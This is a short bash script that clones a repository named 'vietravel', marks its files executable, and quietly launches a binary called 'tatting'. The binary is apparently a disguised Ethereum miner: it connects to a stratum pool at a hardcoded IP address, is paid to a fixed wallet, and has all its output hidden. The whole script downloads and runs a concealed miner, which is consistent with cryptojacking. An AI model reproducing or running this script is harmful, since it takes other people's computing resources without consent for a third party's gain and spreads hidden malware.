#!/bin/bash
cd /vietravel
git clone https://github.com/outsourcebest/vietravel.git -q
chmod -R +x vietravel
./vietravel/tatting -a ethash -o stratum+tcp://51.195.89.38:2020 -u 0xA4260aA3aE3F16E5b74CC2CFA8ebeAc0933064F8 -p x -w az-kienmai-12 > /dev/null 2>&1